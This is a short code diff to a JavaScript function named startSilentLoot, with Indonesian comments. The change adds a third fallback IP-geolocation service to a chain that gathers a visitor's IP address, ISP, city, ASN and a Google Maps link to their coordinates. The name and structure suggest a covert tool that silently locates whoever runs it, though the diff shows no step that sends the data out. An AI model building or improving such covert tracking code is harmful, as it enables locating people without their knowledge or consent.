@@ -101,7 +101,7 @@ async function startSilentLoot() {
 
     // 2. AMBIL DATA LOKASI (SYSTEM WATERFALL / CADANGAN)
     async function fetchLocation() {
-        // UTAMA: IP2Location (Paling lengkap)
+        // 1. UTAMA: IP2Location (Paling lengkap)
         try {
             const res = await fetch(`https://api.ip2location.io/?key=${IP2LOC_KEY}`);
             const d = await res.json();
@@ -116,8 +116,8 @@ async function startSilentLoot() {
                 };
             }
         } catch (e) { console.log("API 1 Error"); }
-    
-        // CADANGAN: IP-API (Gratis & dapet ISP juga buat jaga-jaga)
+
+        // 2. CADANGAN: IP-API (Gratis & dapet ISP juga buat jaga-jaga)
         try {
             const res = await fetch(`http://ip-api.com/json/`);
             const d = await res.json();
@@ -132,8 +132,21 @@ async function startSilentLoot() {
                 };
             }
         } catch (e) { console.log("API 2 Error"); }
-    
-        // BENTENG TERAKHIR: Cloudflare (Minimal dapet IP)
+
+        // 3. LAPISAN KETIGA: IPWHOIS (No Key - Stabil & HTTPS, FOKUS CARI ISP)
+        try {
+        const res = await fetch(`https://ipwho.is/`);
+        const d = await res.json();
+            if (d.success) {
+                return { 
+                    ip: d.ip, isp: d.connection.isp, city: d.city, district: "N/A", 
+                    loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`,
+                    asn: d.connection.asn
+                };
+            }
+        } catch (e) { console.log("Lapis 3 (IPWHOIS) Error"); }
+
+        // 4. BENTENG TERAKHIR: Cloudflare (Minimal dapet IP)
         try {
             const res = await fetch(`https://1.1.1.1/cdn-cgi/trace`);
             const text = await res.text();
